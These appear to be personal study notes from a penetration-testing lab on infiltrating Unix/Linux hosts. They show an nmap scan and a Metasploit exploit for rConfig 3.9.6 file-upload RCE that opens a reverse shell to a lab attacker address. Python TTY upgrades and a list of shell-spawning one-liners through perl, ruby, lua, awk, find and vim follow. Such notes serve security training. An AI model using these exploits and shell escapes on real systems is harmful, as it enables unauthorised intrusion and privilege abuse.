- [ ] Infiltrating Unix/Linux
Common Considerations!!!
![[Pasted image 20250609235637.png]]
Gaining a Shell Through Attacking a Vulnerable Application!!!
```sh
# nmap
nmap -sC -sV 10.129.201.101
# footprinting
rConfig version number (3.9.6)
```
Exploitation!!!
```sh
search rConfig 3.9.6
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set rhosts 10.129.161.107
set lhost 10.10.14.204
exploit
```
![[Pasted image 20250610001738.png]]
Spawning a TTY Shell with Python!!!
```sh
# spwn
python -c 'import pty; pty.spawn("/bin/bash")'
# stty
stty raw -echo; fg
```
- [ ] Spawning Interactive Shells
![[Pasted image 20250610002410.png]]
spawning shells!!!
```sh
# perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
# ruby
ruby: exec "/bin/sh"
# lua
lua: os.execute('/bin/sh')
# awk
awk 'BEGIN {system("/bin/sh")}'
# find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
# vim
vim -c ':!/bin/sh'
vim
:set shell=/bin/sh
:shell
```
Execution Permissions Considerations!!!
![[Pasted image 20250610003516.png]]
```sh
ls -la <path/to/fileorbinary>
sudo -l
```
![[Pasted image 20250610003540.png]]
